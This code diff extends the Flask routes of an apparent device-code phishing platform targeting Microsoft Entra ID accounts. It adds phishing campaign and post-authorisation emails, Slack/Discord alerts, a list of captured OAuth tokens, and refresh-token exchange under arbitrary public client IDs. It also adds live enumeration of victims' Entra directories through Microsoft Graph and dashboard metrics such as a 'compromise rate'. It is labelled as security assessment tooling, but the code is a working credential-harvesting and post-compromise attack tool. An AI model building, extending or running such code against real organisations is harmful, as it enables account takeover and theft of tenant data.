@@ -4,12 +4,64 @@ from flask import Blueprint, render_template, request, jsonify, redirect, url_fo
 from werkzeug.security import check_password_hash, generate_password_hash
 from app import db, socketio
 from app.models import SMTPConfig, AzureAppConfig, Campaign, DeviceCodeSession, CapturedToken, NotificationConfig, User
-from app.services import create_campaign, launch_campaign, get_access_token_from_refresh, get_effective_device_code_config
+from app.campaign_report import build_campaign_report
+from app.entra_enum import (
+    ENTRA_SECTIONS,
+    DEFAULT_ENUM_SCOPE,
+    resolve_enum_client,
+    resolve_enum_token_scopes,
+    fetch_entra_section,
+    fetch_all_entra_counts,
+)
+from app.identity import jwt_scope_claims
 from app.notification_sender import send_session_notification
 from app.device_code import request_device_code, FULL_SCOPE
-from app.services import get_default_email_body
+from app.services import (
+    create_campaign,
+    launch_campaign,
+    get_access_token_from_refresh,
+    get_effective_device_code_config,
+    send_campaign_test_email,
+    get_default_email_body,
+    get_default_post_auth_email_body,
+)
+from app.resourses.app_to_all_list import client_list as PUBLIC_CLIENT_LIST
 
 main_bp = Blueprint("main", __name__)
+
+
+def _public_clients_for_picker():
+    """Device-code-capable public clients (probe + tenant-restriction filtered)."""
+    return sorted(PUBLIC_CLIENT_LIST, key=lambda item: (item.get("name") or "").lower())
+
+
+def _enum_request_access_token():
+    """Optional JWT override from header or query (used by Entra enumeration APIs)."""
+    header_token = (request.headers.get("X-Enum-Access-Token") or "").strip()
+    if header_token:
+        return header_token
+    query_token = (request.args.get("access_token") or "").strip()
+    return query_token or None
+
+
+def _enum_request_client_id():
+    client_id = request.args.get("client_id")
+    if client_id is None:
+        return None
+    return client_id.strip() or None
+
+
+def _campaign_edit_context(**extra):
+    """Shared template context for campaign create/edit forms."""
+    base = {
+        "smtp_configs": SMTPConfig.query.filter_by(is_active=True).all(),
+        "azure_configs": AzureAppConfig.query.filter_by(is_active=True).all(),
+        "default_email_body": get_default_email_body(),
+        "default_post_auth_email_body": get_default_post_auth_email_body(),
+        "public_clients": _public_clients_for_picker(),
+    }
+    base.update(extra)
+    return base
 
 
 @main_bp.before_request
@@ -184,6 +236,25 @@ def notifications():
     return render_template("notification_edit.html", config=config)
 
 
+@main_bp.route("/api/notifications/test", methods=["POST"])
+def api_notifications_test():
+    """Send a test Slack or Discord message using credentials from the form (saved or unsaved)."""
+    from app.notification_sender import send_test_notification
+
+    data = request.get_json(silent=True) or {}
+    platform = (data.get("platform") or "").strip().lower()
+    ok, detail = send_test_notification(
+        platform,
+        slack_bot_token=data.get("slack_bot_token"),
+        slack_channel=data.get("slack_channel"),
+        discord_bot_token=data.get("discord_bot_token"),
+        discord_channel_id=data.get("discord_channel_id"),
+    )
+    if ok:
+        return jsonify({"ok": True, "message": detail})
+    return jsonify({"ok": False, "error": detail}), 400
+
+
 # ---------- SMTP Config ----------
 @main_bp.route("/smtp")
 def smtp_list():
@@ -322,10 +393,6 @@ def campaign_list():
 
 @main_bp.route("/campaigns/new", methods=["GET", "POST"])
 def campaign_new():
-    smtp_configs = SMTPConfig.query.filter_by(is_active=True).all()
-    azure_configs = AzureAppConfig.query.filter_by(is_active=True).all()
-    default_email_body = get_default_email_body()
-
     if request.method == "POST":
         email_delivery = (request.form.get("email_delivery_method") or "none").strip().lower()
         if email_delivery not in ("none", "smtp", "azure", "api"):
@@ -341,6 +408,9 @@ def campaign_new():
 
         # Public client_id (only used when not using Azure App config).
         public_client_id = (request.form.get("public_client_id") or "").strip() or None
+        send_post_auth = request.form.get("send_post_auth_email") == "yes"
+        default_email_body = get_default_email_body()
+        default_post_auth_email_body = get_default_post_auth_email_body()
 
         c = create_campaign(
             name=request.form.get("name"),
@@ -352,9 +422,16 @@ def campaign_new():
             email_body_html=request.form.get("email_body_html") or default_email_body,
             extra_scopes=extra_scopes,
             public_client_id=public_client_id,
+            send_post_auth_email=send_post_auth,
+            post_auth_email_subject=request.form.get("post_auth_email_subject") or None,
+            post_auth_email_body_html=request.form.get("post_auth_email_body_html") or default_post_auth_email_body,
         )
         return redirect(url_for("main.campaign_edit", id=c.id))
-    return render_template("campaign_edit.html", campaign=None, smtp_configs=smtp_configs, azure_configs=azure_configs, default_email_body=default_email_body)
+    return render_template(
+        "campaign_edit.html",
+        campaign=None,
+        **_campaign_edit_context(),
+    )
 
 
 @main_bp.route("/campaigns/<int:id>")
@@ -383,12 +460,22 @@ def campaign_detail(id):
     )
 
 
+@main_bp.route("/campaigns/<int:id>/report")
+def campaign_report(id):
+    """Printable security assessment report for a campaign."""
+    campaign = Campaign.query.get_or_404(id)
+    now = datetime.utcnow()
+    sessions = DeviceCodeSession.query.filter_by(campaign_id=id).order_by(
+        DeviceCodeSession.created_at.desc()
+    ).all()
+    report = build_campaign_report(campaign, sessions=sessions, now=now)
+    embed = request.args.get("embed") in ("1", "true", "yes")
+    return render_template("campaign_report.html", report=report, embed=embed)
+
+
 @main_bp.route("/campaigns/<int:id>/edit", methods=["GET", "POST"])
 def campaign_edit(id):
     campaign = Campaign.query.get_or_404(id)
-    smtp_configs = SMTPConfig.query.filter_by(is_active=True).all()
-    azure_configs = AzureAppConfig.query.filter_by(is_active=True).all()
-    default_email_body = get_default_email_body()
 
     if request.method == "POST":
         import secrets
@@ -405,7 +492,12 @@ def campaign_edit(id):
         campaign.azure_email_config_id = int(request.form.get("azure_email_config_id")) if request.form.get("azure_email_config_id") else None
         campaign.azure_email_from = request.form.get("azure_email_from") or None
         campaign.email_subject = request.form.get("email_subject")
+        default_email_body = get_default_email_body()
+        default_post_auth_email_body = get_default_post_auth_email_body()
         campaign.email_body_html = request.form.get("email_body_html") or default_email_body
+        campaign.send_post_auth_email = request.form.get("send_post_auth_email") == "yes"
+        campaign.post_auth_email_subject = request.form.get("post_auth_email_subject") or None
+        campaign.post_auth_email_body_html = request.form.get("post_auth_email_body_html") or default_post_auth_email_body
 
         # Update public client id (only used when not using Azure App config).
         raw_public = (request.form.get("public_client_id") or "").strip()
@@ -413,7 +505,26 @@ def campaign_edit(id):
         # Extra scopes are no longer configured via checkboxes in the UI.
         db.session.commit()
         return redirect(url_for("main.campaign_detail", id=campaign.id))
-    return render_template("campaign_edit.html", campaign=campaign, smtp_configs=smtp_configs, azure_configs=azure_configs, default_email_body=default_email_body)
+    return render_template(
+        "campaign_edit.html",
+        campaign=campaign,
+        **_campaign_edit_context(),
+    )
+
+
+@main_bp.route("/campaigns/send-test-email", methods=["POST"])
+@main_bp.route("/campaigns/<int:id>/send-test-email", methods=["POST"])
+def campaign_send_test_email(id=None):
+    """Send a test device-code or post-auth email using current form settings."""
+    payload = request.get_json(silent=True) or {}
+    to_email = (payload.get("to_email") or "").strip()
+    email_type = (payload.get("email_type") or "").strip().lower()
+    campaign = Campaign.query.get(id) if id else None
+
+    ok, err = send_campaign_test_email(to_email, email_type, payload, campaign)
+    if not ok:
+        return jsonify({"ok": False, "error": err or "Failed to send test email"}), 400
+    return jsonify({"ok": True, "message": f"Test email sent to {to_email}."})
 
 
 @main_bp.route("/campaigns/<int:id>/delete", methods=["POST"])
@@ -626,17 +737,9 @@ def sessions_delete_all(campaign_id):
 def token_list():
     from app.resourses.resource_list import resource_list as ALL_RESOURCES
 
-    # Load tokens newest-first, but ensure we only show ONE token per session_id
-    raw_tokens = CapturedToken.query.order_by(
-        CapturedToken.session_id.asc(), CapturedToken.created_at.desc(), CapturedToken.id.desc()
+    tokens = CapturedToken.query.order_by(
+        CapturedToken.created_at.desc(), CapturedToken.id.desc()
     ).all()
-    seen_sessions = set()
-    tokens = []
-    for t in raw_tokens:
-        if t.session_id in seen_sessions:
-            continue
-        seen_sessions.add(t.session_id)
-        tokens.append(t)
     # Build a lightweight list for the UI: name, appId, and permission id.
     resources = [
         {
@@ -647,21 +750,104 @@ def token_list():
         for r in ALL_RESOURCES
         if r.get("name") and r.get("appId") and r.get("p_id")
     ]
-    return render_template("token_list.html", tokens=tokens, resources=resources)
+    return render_template(
+        "token_list.html",
+        tokens=tokens,
+        resources=resources,
+        public_clients=_public_clients_for_picker(),
+    )
+
+
+@main_bp.route("/tokens/<int:id>/enum")
+def token_enum(id):
+    """Live Entra ID enumeration workspace for a captured token."""
+    token = CapturedToken.query.get_or_404(id)
+    default_client_id, default_client_name = resolve_enum_client(id)
+    token_scopes = resolve_enum_token_scopes(id)
+    return render_template(
+        "token_enum.html",
+        token=token,
+        sections=ENTRA_SECTIONS,
+        default_client_id=default_client_id,
+        default_client_name=default_client_name,
+        token_scopes=token_scopes,
+        initial_access_token=token.access_token or "",
+        default_enum_scope=DEFAULT_ENUM_SCOPE,
+    )
+
+
+@main_bp.route("/api/tokens/<int:id>/entra/counts", methods=["GET"])
+def api_token_entra_counts(id):
+    """Total counts for all Entra enumeration sections."""
+    CapturedToken.query.get_or_404(id)
+    client_id = _enum_request_client_id()
+    access_token = _enum_request_access_token()
+    data, err = fetch_all_entra_counts(id, client_id=client_id, access_token_override=access_token)
+    if err:
+        return jsonify({"ok": False, "error": err}), 400
+    return jsonify(data)
+
+
+@main_bp.route("/api/tokens/<int:id>/entra/<section>", methods=["GET"])
+def api_token_entra_enum(id, section):
+    """Enumerate Entra ID objects via Microsoft Graph using a captured refresh token."""
+    CapturedToken.query.get_or_404(id)
+    client_id = _enum_request_client_id()
+    access_token = _enum_request_access_token()
+    next_link = request.args.get("next") or None
+    try:
+        data, err = fetch_entra_section(
+            id,
+            section,
+            client_id=client_id,
+            next_link=next_link,
+            access_token_override=access_token,
+        )
+    except ValueError as exc:
+        return jsonify({"ok": False, "error": str(exc)}), 404
+    if err:
+        return jsonify({"ok": False, "error": err}), 400
+    return jsonify(data)
 
 
 @main_bp.route("/api/tokens/<int:id>/access-token", methods=["POST"])
 def api_get_access_token(id):
-    """Get a fresh access token using the stored refresh token. Optional JSON: { \"scope\": \"https://...\" }."""
+    """Get a fresh access token using the stored refresh token. Optional JSON: { \"scope\": \"https://...\", \"client_id\": \"...\" }."""
     scope = None
+    client_id = None
     if request.is_json and request.json:
         scope = request.json.get("scope") or None
+        client_id = request.json.get("client_id") or None
     if scope is None and request.form:
         scope = request.form.get("scope") or None
-    data, err = get_access_token_from_refresh(id, scope=scope)
+    if client_id is None and request.form:
+        client_id = request.form.get("client_id") or None
+    data, err = get_access_token_from_refresh(id, scope=scope, client_id=client_id)
     if err:
         return jsonify({"ok": False, "error": err}), 400
-    return jsonify({"ok": True, "access_token": data.get("access_token"), "expires_in": data.get("expires_in"), "scope": data.get("scope")})
+    access_token = data.get("access_token")
+    return jsonify({
+        "ok": True,
+        "access_token": access_token,
+        "expires_in": data.get("expires_in"),
+        "scope": data.get("scope"),
+        "token_scopes": jwt_scope_claims(access_token) if access_token else {},
+        "token_url": data.get("token_url"),
+        "client_id": data.get("client_id"),
+        "requested_scope": data.get("requested_scope"),
+    })
+
+
+@main_bp.route("/api/tokens/<int:id>/jwt-info", methods=["POST"])
+def api_token_jwt_info(id):
+    """Decode scope/role claims from a JWT access token."""
+    CapturedToken.query.get_or_404(id)
+    access_token = ""
+    if request.is_json and request.json:
+        access_token = (request.json.get("access_token") or "").strip()
+    if not access_token:
+        return jsonify({"ok": False, "error": "access_token required"}), 400
+    return jsonify({"ok": True, "token_scopes": jwt_scope_claims(access_token)})
 
 
 @main_bp.route("/tokens/<int:id>/delete", methods=["POST"])
@@ -674,17 +860,109 @@ def token_delete(id):
 
 
 # ---------- API for dashboard / campaign stats ----------
-@main_bp.route("/api/stats")
-def api_stats():
+def _dashboard_stats():
+    """Aggregate platform-wide metrics for the dashboard."""
+    now = datetime.utcnow()
     campaigns = Campaign.query.count()
     sessions = DeviceCodeSession.query.count()
     pending = DeviceCodeSession.query.filter_by(status="pending").count()
     authorized = DeviceCodeSession.query.filter_by(status="authorized").count()
+    expired = DeviceCodeSession.query.filter_by(status="expired").count()
+    error = DeviceCodeSession.query.filter_by(status="error").count()
+    denied = DeviceCodeSession.query.filter(
+        DeviceCodeSession.status.in_(("denied", "cancelled"))
+    ).count()
     tokens = CapturedToken.query.count()
-    return jsonify({
+    emails_sent = DeviceCodeSession.query.filter_by(email_sent=True).count()
+    personal = DeviceCodeSession.query.filter_by(account_type="personal").count()
+    corporate = DeviceCodeSession.query.filter_by(account_type="corporate").count()
+    unknown_acct = max(0, sessions - personal - corporate)
+
+    compromise_rate = round((authorized / sessions) * 100, 1) if sessions else 0.0
+    delivery_rate = round((emails_sent / sessions) * 100, 1) if sessions else 0.0
+
+    running_campaigns = 0
+    campaign_rows = []
+    for c in Campaign.query.order_by(Campaign.created_at.desc()).limit(12).all():
+        sess_list = c.sessions.all()
+        has_pending = any(
+            s.status == "pending" and (not s.expires_at or s.expires_at > now)
+            for s in sess_list
+        )
+        if has_pending:
+            running_campaigns += 1
+            ui_status = "running"
+        elif sess_list:
+            ui_status = "completed"
+        else:
+            ui_status = c.status or "draft"
+        total = len(sess_list)
+        campaign_rows.append({
+            "id": c.id,
+            "name": c.name or "Unnamed",
+            "ui_status": ui_status,
+            "total_sessions": total,
+            "authorized_sessions": sum(1 for s in sess_list if s.status == "authorized"),
+            "pending_sessions": sum(1 for s in sess_list if s.status == "pending"),
+            "created_at": c.created_at.isoformat() if c.created_at else None,
+        })
+
+    recent_authorized = []
+    for s in (
+        DeviceCodeSession.query.filter_by(status="authorized")
+        .order_by(DeviceCodeSession.updated_at.desc())
+        .limit(10)
+        .all()
+    ):
+        recent_authorized.append({
+            "id": s.id,
+            "campaign_id": s.campaign_id,
+            "campaign_name": (s.campaign.name if s.campaign else None) or "Unnamed",
+            "display_target": s.display_target,
+            "user_email": s.user_email or s.target_email or "-",
+            "account_type": s.account_type or "-",
+            "updated_at": s.updated_at.isoformat() if s.updated_at else None,
+        })
+
+    outcome_max = max(sessions, 1)
+    outcomes = [
+        {"label": "Authorized", "value": authorized, "color": "#f85149", "pct": round(authorized / outcome_max * 100, 1)},
+        {"label": "Pending", "value": pending, "color": "#d29922", "pct": round(pending / outcome_max * 100, 1)},
+        {"label": "Expired", "value": expired, "color": "#8b949e", "pct": round(expired / outcome_max * 100, 1)},
+        {"label": "Error", "value": error, "color": "#f85149", "pct": round(error / outcome_max * 100, 1)},
+        {"label": "Denied / cancelled", "value": denied, "color": "#6e7681", "pct": round(denied / outcome_max * 100, 1)},
+    ]
+
+    accounts = [
+        {"label": "Corporate", "value": corporate, "color": "#388bfd", "pct": round(corporate / max(sessions, 1) * 100, 1)},
+        {"label": "Personal (MSA)", "value": personal, "color": "#8957e5", "pct": round(personal / max(sessions, 1) * 100, 1)},
+        {"label": "Unknown", "value": unknown_acct, "color": "#8b949e", "pct": round(unknown_acct / max(sessions, 1) * 100, 1)},
+    ]
+
+    return {
+        "generated_at": now.isoformat() + "Z",
         "campaigns": campaigns,
+        "campaigns_running": running_campaigns,
         "sessions": sessions,
         "pending": pending,
         "authorized": authorized,
+        "expired": expired,
+        "error": error,
+        "denied": denied,
         "captured_tokens": tokens,
-    })
+        "emails_sent": emails_sent,
+        "compromise_rate": compromise_rate,
+        "delivery_rate": delivery_rate,
+        "account_personal": personal,
+        "account_corporate": corporate,
+        "account_unknown": unknown_acct,
+        "outcomes": outcomes,
+        "accounts": accounts,
+        "campaigns_recent": campaign_rows,
+        "recent_authorized": recent_authorized,
+    }
+
+
+@main_bp.route("/api/stats")
+def api_stats():
+    return jsonify(_dashboard_stats())
